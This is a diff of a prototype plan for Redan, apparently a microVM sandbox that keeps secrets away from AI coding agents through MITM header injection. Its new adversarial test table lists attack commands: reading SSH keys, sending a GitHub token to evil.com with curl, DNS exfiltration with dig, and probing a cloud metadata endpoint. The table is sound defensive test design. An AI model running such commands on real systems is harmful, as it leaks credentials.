@@ -1,237 +1,266 @@
 # 9. Prototype Plan
 
+*Revised per oracle reviews. Expanded spikes, added PS-6 adversarial suite, 4-week schedule.*
+
 ## 9.1 Spike Overview
 
-Five focused spikes, ordered by dependency and risk retirement. Each spike is a standalone Rust binary (not the final product codebase) that answers a specific question.
+Six spikes, ordered by dependency and risk retirement.
 
 ```
-PS-1: libkrun + network interception
-  ↓ (determines networking approach)
-PS-2: virtio-fs performance ←── can run parallel with PS-1
+PS-1: libkrun + network interception + raw IP blocking
+  ↓ (determines networking approach — GATING SPIKE)
+PS-2: virtio-fs performance + symlink traversal ←── parallel with PS-1
   ↓
-PS-3: agent transparency (depends on PS-1 + PS-2 for working VM)
+PS-3: agent transparency (depends on PS-1 + PS-2)
   ↓
-PS-4: MITM proxy + secret injection (depends on PS-1)
+PS-4: MITM proxy + CA + Host validation + response scrubbing (depends on PS-1)
   ↓
 PS-5: end-to-end secret flow (depends on PS-4)
+  ↓
+PS-6: adversarial test suite (depends on PS-4 + PS-5)
 ```
 
 ---
 
-## PS-1: libkrun VM Boot + Network Interception
+## PS-1: libkrun VM Boot + Network Interception (GATING)
 
-**Question:** Can we boot a libkrun microVM, route its network traffic through our host process, and intercept TCP connections with enough visibility to implement a MITM proxy?
+**Question:** Can we boot a libkrun microVM, intercept guest TCP connections at the host, and do it fast enough?
 
 **What to build:**
-- Rust binary that creates a libkrun VM context
-- Boot a minimal Linux image (Alpine or similar)
-- Configure TSI networking
-- Intercept a TCP connection from guest to an external host
-- Log the connection details (destination host, port)
-- If TSI doesn't allow interception: try passt/gvproxy mode
-- Measure boot time (target: <300ms)
+- Rust binary: create libkrun VM context, boot minimal Linux image
+- Configure TSI networking, attempt to intercept a TCP connection
+- If TSI doesn't allow interception: try passt/gvproxy mode (virtio-net)
+- Test raw IP connection blocking (guest connects to IP, verify host drops it)
+- Test IPv6 blocking (::1, fe80::, fc00::)
+- Measure boot time (target: <500ms)
+- Test on BOTH Linux x86_64 AND macOS aarch64
+- Evaluate OCI image handling: test `oci-distribution` crate or `skopeo`
 
 **Success criteria:**
-- VM boots successfully on Linux (x86_64) and macOS (aarch64)
-- Guest can make a TCP connection that routes through host process
-- Host process can see destination host and port before forwarding
-- Boot time <300ms on both platforms
+- VM boots on Linux and macOS
+- Guest TCP connection routable through host process with destination visibility
+- Raw IP connections blockable
+- Boot time <500ms on both platforms
 
 **Failure criteria:**
-- Cannot intercept connections in any networking mode → MITM approach needs rethink
-- Boot time >1s → warm pool required for MVP
+- Cannot intercept in any mode → **STOP. Architecture needs redesign.**
+- Boot time >1s → warm pool required for MVP, not deferred
+- macOS crashes → defer macOS to v1.0
 
-**Expected time:** 3-5 days
-
-**Risks retired:** R1 (TSI networking), R5 (macOS stability), R6 (boot time)
+**Time:** 5 days
+**Risks retired:** R1 (TSI), R5 (macOS), R6 (boot time), R8 (OCI handling), R17 (raw IP)
 
 ---
 
-## PS-2: virtio-fs Performance
+## PS-2: virtio-fs Performance + Security
 
-**Question:** What's the filesystem performance overhead of virtio-fs for typical agent workflows?
+**Question:** Is virtio-fs fast enough for agent workflows, and can we prevent symlink traversal?
 
 **What to build:**
-- Use the VM from PS-1 (or a parallel minimal setup)
-- Mount a real-world project directory (~10K-50K files) via virtio-fs
-- Benchmark inside the VM:
-  - `find . -name "*.py" | wc -l` (tree walk)
-  - `grep -r "import" --include="*.py" | wc -l` (content search)
-  - Sequential read of 100 files
-  - Write 100 files
-  - `git status` (exercises filesystem metadata heavily)
-- Compare to same operations on host natively
+- Mount a real project directory (10K-50K files) via virtio-fs
+- Benchmark inside VM: `find`, `grep -r`, sequential read 100 files, write 100 files, `git status`
+- Compare to host-native performance
+- **Adversarial symlink test:** create project with `symlink → ~/.ssh/`, mount, verify guest CANNOT read through the symlink
+- Test hardlinks and `..` traversal through mount boundary
+- Test on both Linux and macOS
 
 **Success criteria:**
 - Overhead <2x for all operations
-- `git status` completes in reasonable time (<5s for 10K file repo)
-- No errors or data corruption
+- `git status` <5s for 10K file repo
+- Symlinks outside shared root: ENOENT or permission denied
+- No data corruption
 
 **Failure criteria:**
-- Overhead >5x for common operations → need alternative (9p, copy-in model)
-- Data corruption or consistency issues → blocker
+- Overhead >5x → need alternative (9p, copy-in)
+- Symlink traversal works → **BLOCKER. Must fix before proceeding.**
+- Data corruption → BLOCKER
 
-**Expected time:** 2-3 days (can run parallel with PS-1 if using microsandbox's existing VM setup for initial testing)
-
-**Risks retired:** R2 (virtio-fs performance)
+**Time:** 3 days (parallel with PS-1)
+**Risks retired:** R2 (virtio-fs perf), R14 (symlink traversal)
 
 ---
 
 ## PS-3: Agent Transparency
 
-**Question:** Can Claude Code, Codex, and a basic shell run transparently inside a libkrun microVM?
+**Question:** Can Claude Code run transparently inside a libkrun microVM?
 
 **What to build:**
-- Use the VM from PS-1/PS-2 with a `node:22` image (for Claude Code) and stock `ubuntu:24.04`
-- Install Claude Code inside the VM
-- Run Claude Code with a simple task: "Create a Python file that prints hello world and run it"
-- Document everything that works and everything that breaks
-- Repeat with Codex (in non-sandboxed mode)
-- Repeat with interactive bash (developer manual testing)
-
-**Observe:**
-- Does the agent's terminal I/O work correctly (colors, cursor, interactive prompts)?
-- Does the agent detect it's in a VM? Does it behave differently?
-- Do `git` operations work with virtio-fs?
-- What errors or warnings appear?
-- What files does the agent try to access outside `/workspace`?
+- VM from PS-1/PS-2 with `node:22` image
+- Install Claude Code, run basic coding task: "Create hello.py, run it, commit to git"
+- Document everything that works and breaks
+- Test interactive bash session (colors, tab completion, editors)
+- Test git operations on mounted project directory
+- Observe: what files does the agent try to access outside `/workspace`?
+- Test with Codex (non-sandboxed mode) if time permits
 
 **Success criteria:**
-- Claude Code completes a basic coding task without errors
-- Interactive bash session works (colors, tab completion, vim/nano)
-- git operations work on the mounted project directory
+- Claude Code completes a basic coding task
+- Interactive bash works (colors, cursor, PTY)
+- Git operations work on virtio-fs mount
 
 **Failure criteria:**
-- Claude Code can't start or crashes inside VM → need compatibility investigation
-- Terminal I/O is broken → need PTY configuration work
-- >50% of typical agent operations fail → Layer 1 may not be viable as primary
+- Claude Code can't start → investigate, document blockers
+- >50% of operations fail → Layer 1 may not be viable as primary
 
-**Expected time:** 3-4 days
-
+**Time:** 3-4 days
 **Risks retired:** R3 (agent transparency), R12 (agent execution model)
-
-**Dependencies:** PS-1 (working VM), PS-2 (working filesystem)
+**Dependencies:** PS-1, PS-2
 
 ---
 
-## PS-4: MITM Proxy with Secret Injection
+## PS-4: MITM Proxy + Secret Injection
 
-**Question:** Can we build a Rust MITM proxy that terminates TLS from the guest, injects secrets into HTTP headers, and forwards to the real destination — and does this work with npm, pip, cargo, and git?
+**Question:** Can we build a Rust MITM proxy that works with real package managers and validates Host headers?
 
 **What to build:**
-- Rust binary using `tokio` + `rustls` + `rcgen`
+- Rust binary: `tokio` + `rustls` + `rcgen` + `hyper`
 - Generate ephemeral CA on startup
-- Accept TCP connections from guest (via TSI or passt)
 - For TLS connections: extract SNI, generate leaf cert, terminate guest TLS
-- Parse HTTP request, scan for placeholder tokens in headers
-- Replace placeholder with real value if destination is in allowed hosts
-- Open real TLS connection to destination, forward modified request
-- Stream response back
-- Install CA cert in guest trust store
+- Parse HTTP request via `hyper` (no custom parsing)
+- Scan headers for placeholder tokens, replace with real value if destination matches
+- **Host header validation:** verify HTTP `Host`/`:authority` matches TCP destination
+- **Response header scrubbing:** scan response headers for injected values, replace with placeholder
+- Install CA cert in guest trust store via `SSL_CERT_FILE` env var
+- Auto-set `NODE_EXTRA_CA_CERTS`, `REQUESTS_CA_BUNDLE`, `GIT_SSL_CAINFO` in guest env
 - Test with: `curl`, `npm install`, `pip install`, `cargo build`, `git clone`
+- Test HTTP/2 (including CONTINUATION frame reassembly)
+- Test WebSocket upgrade
 
 **Success criteria:**
-- MITM proxy works for HTTPS traffic
-- Placeholder in `Authorization` header correctly replaced with real value
-- npm, pip, cargo, git all work through the proxy (accept the ephemeral CA)
+- MITM works for HTTPS traffic
+- Placeholder replacement works in Authorization header
+- npm, pip, cargo, git all work through proxy (accept ephemeral CA)
+- Host header mismatch correctly blocked
+- Response headers scrubbed for injected values
 - Latency overhead <100ms per request
 
 **Failure criteria:**
-- Major package managers reject ephemeral CA despite `NODE_EXTRA_CA_CERTS`, `REQUESTS_CA_BUNDLE`, etc. → fall back to CONNECT proxy + env injection
-- Latency >500ms per request → proxy architecture needs optimization
-- HTTP/2 or streaming responses break → need more sophisticated proxy
+- Major package managers reject CA despite env vars → fall back to CONNECT proxy + env injection (weaker but functional)
+- Latency >500ms → proxy architecture needs optimization
+- HTTP/2 breaks → need more sophisticated proxy (extend timeline)
 
-**Expected time:** 5-7 days (most complex spike)
-
-**Risks retired:** R1 (network interception for MITM), R4 (CA compatibility)
-
-**Dependencies:** PS-1 (network routing from VM through host)
+**Time:** 7 days (most complex spike)
+**Risks retired:** R1 (MITM viability), R4 (CA compat), R19 (domain fronting), R20 (request smuggling)
+**Dependencies:** PS-1
 
 ---
 
 ## PS-5: End-to-End Secret Flow
 
-**Question:** Can we demonstrate the full secret lifecycle — retrieve from a backend, inject via MITM, verify the agent inside the VM can use the API without seeing the real secret?
+**Question:** Does the full lifecycle work: retrieve → inject → scrub → audit → zeroize?
 
 **What to build:**
-- Extend PS-4 with a secret backend integration
-- Start simple: `env` backend (read from host environment)
+- Extend PS-4 with `env` secret backend
 - Configure: `GITHUB_TOKEN` from env, inject for `api.github.com`
-- Inside VM: run `curl -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/user`
+- Inside VM: `curl -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/user`
 - Verify:
-  - `echo $GITHUB_TOKEN` inside VM prints placeholder (not real token)
-  - The curl request succeeds (real token injected by proxy)
-  - Audit log shows: secret configured, secret injected, destination host
-- Then add one enterprise backend: HashiCorp Vault (dev mode)
-  - Run Vault in dev mode on host
-  - Store a test secret
-  - Configure Redan to read from Vault
-  - Verify same flow
+  - `echo $GITHUB_TOKEN` prints placeholder (not real token)
+  - curl request succeeds (real token injected by proxy)
+  - Response headers scrubbed if they contain the real token
+  - Audit log (host-only path) shows: secret configured, injected, host allowed
+- Test executable file detection: write `.git/hooks/pre-commit` inside VM, verify warning on teardown
+- Test zeroization: dump host process memory after session, verify no secret residue
+- Optional: HashiCorp Vault in dev mode as second backend
 
 **Success criteria:**
 - env backend: secret injected, API call succeeds, guest never sees real value
-- Vault backend: same, with Vault authentication working
-- Audit log captures all events
-- Secret zeroized from host memory on session teardown (verify with memory dump)
+- Response header scrubbing works
+- Audit log captures all events at host-only path
+- Executable file modification detected and warned
+- `zeroize` clears secrets from host memory on teardown
 
 **Failure criteria:**
-- Secret injection doesn't work reliably → architecture needs rethink
-- Vault integration is too complex for the benefit → defer enterprise backends
+- Secret injection unreliable → architecture needs rethink
+- Audit log missing events → fix before MVP
 
-**Expected time:** 3-4 days
-
-**Risks retired:** R9 (backend authentication), validates entire secret injection model
-
-**Dependencies:** PS-4 (MITM proxy)
+**Time:** 4 days
+**Risks retired:** R9 (backend auth), R13 (git hooks detection), R15 (audit location), R18 (response reflection)
+**Dependencies:** PS-4
 
 ---
 
-## 9.2 Spike Schedule
+## PS-6: Adversarial Test Suite (NEW)
+
+**Question:** Can we break our own security model?
+
+**What to build:**
+- Automated test harness that boots a Redan session and attempts attacks
+- Each test: expected result documented, automated pass/fail
+
+**Test cases:**
+
+| # | Attack | Expected Result |
+|---|--------|-----------------|
+| A1 | `cat /root/.ssh/id_ed25519` | ENOENT |
+| A2 | `cat /workspace/symlink-to-ssh/id_ed25519` | ENOENT (symlink blocked) |
+| A3 | `curl evil.com -d "$GITHUB_TOKEN"` | Connection dropped (evil.com not allowed) |
+| A4 | `curl 93.184.216.34:443` | Connection dropped (raw IP blocked) |
+| A5 | `curl api.github.com` with `Host: evil.com` | Blocked (Host mismatch) |
+| A6 | `dig $(echo $GITHUB_TOKEN).evil.com` | DNS resolves, but only placeholder in query |
+| A7 | `echo $GITHUB_TOKEN` | Prints placeholder, not real value |
+| A8 | `curl http://169.254.169.254/` | Connection dropped (link-local blocked) |
+| A9 | `curl http://[::1]:8080/` | Connection dropped (IPv6 localhost blocked) |
+| A10 | Write `.git/hooks/pre-commit` | Redan warns on session teardown |
+| A11 | `rm $XDG_STATE_HOME/redan/.../audit.jsonl` | ENOENT (audit log not in VM) |
+| A12 | `env \| grep redan_ph_` | Shows placeholder names (known, documented) |
+| A13 | `nmap 192.168.1.0/24` | All connections dropped (private range) |
+| A14 | Modify `.github/workflows/deploy.yml` | Redan warns on session teardown |
+
+**Success criteria:**
+- All 14 tests pass
+- Test harness runs in CI
+- <5 minutes total execution time
+
+**Failure criteria:**
+- Any test in A1-A9 fails → security bug, fix immediately
+- A10-A14 fail → warning mechanism broken, fix before MVP
+
+**Time:** 3 days
+**Risks retired:** Validates R13, R14, R17, R19 mitigations end-to-end
+**Dependencies:** PS-4, PS-5
+
+---
+
+## 9.2 Schedule
 
 ```
 Week 1:
-├── PS-1: libkrun VM boot + networking (3-5 days)
-└── PS-2: virtio-fs performance (2-3 days, parallel)
+├── PS-1: libkrun + networking + IP blocking (5 days)
+└── PS-2: virtio-fs + symlinks (3 days, parallel)
 
 Week 2:
-├── PS-3: Agent transparency (3-4 days, after PS-1/PS-2)
-└── PS-4: MITM proxy start (begins mid-week after PS-1 networking confirmed)
+├── PS-3: Agent transparency (3-4 days)
+└── PS-4: MITM proxy start (begins after PS-1 networking confirmed)
 
 Week 3:
-├── PS-4: MITM proxy complete (continued)
-└── PS-5: End-to-end secret flow (3-4 days, after PS-4)
+├── PS-4: MITM proxy continued (7 days total)
+├── PS-5: End-to-end secret flow (4 days, after PS-4)
+└── PS-6: Adversarial tests start (after PS-5)
+
+Week 4:
+├── PS-6: Adversarial test suite complete (3 days)
+└── Findings synthesis + architecture updates (2 days)
 ```
 
-**Total: ~3 weeks** to retire all major technical risks.
-
-After spikes: review findings, update architecture (Section 3) and risk register (Section 8), then begin v1 implementation.
+**Total: 4 weeks.** After spikes: review findings, update architecture, decide go/no-go on MVP implementation.
 
 ## 9.3 Spike Outputs
 
 Each spike produces:
-1. **Working code** in `spikes/ps-N/` (disposable, not production code)
-2. **Findings document** in `docs/spikes/ps-N-findings.md`:
-   - What worked
-   - What didn't
-   - Performance measurements
-   - Architecture implications
-   - Updated risk assessment
+1. **Working code** in `spikes/ps-N/` (disposable prototype, not production)
+2. **Findings document** in `docs/spikes/ps-N-findings.md`
 3. **Go/no-go recommendation** for the approach it validates
 
-## Key Decisions
+## 9.4 Decision Gates
 
-1. **Spikes are disposable code.** Don't architect them. Get answers fast. ✅
+| After spike | Decision |
+|-------------|----------|
+| PS-1 | TSI or passt? macOS in MVP or deferred? |
+| PS-2 | virtio-fs viable? Symlink protection works? |
+| PS-3 | Layer 1 (env injection) viable for Claude Code? |
+| PS-4 | MITM or CONNECT proxy? Which package managers work? |
+| PS-5 | Secret injection model validated end-to-end? |
+| PS-6 | Security model holds under adversarial testing? |
 
-2. **PS-1 is the gating spike.** Everything else depends on being able to boot a VM and route network traffic. If PS-1 fails, stop and reassess. ✅
-
-3. **PS-4 (MITM) is the highest-effort spike.** Budget extra time. If it partially fails (some tools don't work with MITM), we have a fallback (CONNECT proxy + env injection). ✅
-
-4. **Test on both Linux and macOS from spike 1.** Don't defer macOS to later — it's a primary platform. Discover issues early. ✅
-
-## Open Questions
-
-1. **Spike environment:** Do we test on a physical macOS machine and a Linux VM? Or use CI for Linux testing? Physical machines give more accurate perf numbers.
-
-2. **Which Vault auth method for PS-5?** Token auth is simplest for dev mode. AppRole is more realistic for production. Recommendation: token for the spike, AppRole for v1.
-
-3. **Should spikes use the same Cargo workspace as the eventual product?** Recommendation: no. Separate directory, separate crate. Spikes are throwaway. Don't let spike code infect the product.
+If PS-1 fails (no interception in any mode): **stop and reassess the entire architecture.**
+If PS-4 partially fails: fall back to CONNECT proxy + env injection. Weaker but shippable.
